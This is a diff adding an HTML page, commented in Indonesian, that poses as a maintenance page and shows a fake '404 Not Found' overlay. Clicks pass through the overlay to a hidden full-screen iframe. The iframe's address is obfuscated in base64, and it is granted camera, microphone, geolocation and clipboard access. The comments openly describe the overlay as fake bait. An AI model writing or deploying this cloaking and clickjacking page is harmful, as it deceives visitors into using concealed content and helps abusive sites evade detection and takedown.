@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Situs Sedang Dimaintenance</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #121212;
+            font-family: sans-serif;
+        }
+        #_0xframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 1;
+        }
+        /* Lapisan teks palsu dibuat transparan terhadap klik */
+        ._0xfake {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #ffffff;
+            z-index: 10;
+            pointer-events: none; /* MEMBUAT KLIK TEMBUS KE IFRAME */
+            user-select: none;
+        }
+        ._0xfake h1 { font-size: 2.5rem; margin-bottom: 10px; text-shadow: 0 0 10px rgba(0,0,0,0.8); }
+        ._0xfake p { color: #aaaaaa; font-size: 1.1rem; text-shadow: 0 0 10px rgba(0,0,0,0.8); }
+    </style>
+</head>
+<body>
+
+    <!-- Tampilan Umpan Palsu yang Bisa Ditembus Klik -->
+    <div class="_0xfake">
+        <h1>404 Not Found</h1>
+        <p>The requested URL was not found on this server.</p>
+    </div>
+
+    <!-- Tempat Web Utama Berjalan -->
+    <div id="_0xcontainer"></div>
+
+    <script>
+        (function() {
+            // URL Web Utama Anda (Terenkripsi Base64)
+            var _0xencUrl = "aHR0cHM6Ly9hc2VweHl6MTIuZ2l0aHViLmlvL2JvdC13YS1kYi9ob3N0aW5nL3J1bmh0bWxfMTc4MTIzMjE2ODY5MS5odG1s";
+            var _0xdecUrl = atob(_0xencUrl);
+
+            var _0xff = document.createElement('iframe');
+            _0xff.setAttribute('id', '_0xframe');
+            _0xff.setAttribute('src', _0xdecUrl);
+            // Izin fitur opsional jika web Anda membutuhkannya
+            _0xff.setAttribute('allow', 'geolocation; microphone; camera; clipboard-write');
+            
+            document.getElementById('_0xcontainer').appendChild(_0xff);
+        })();
+    </script>
+</body>
+</html>
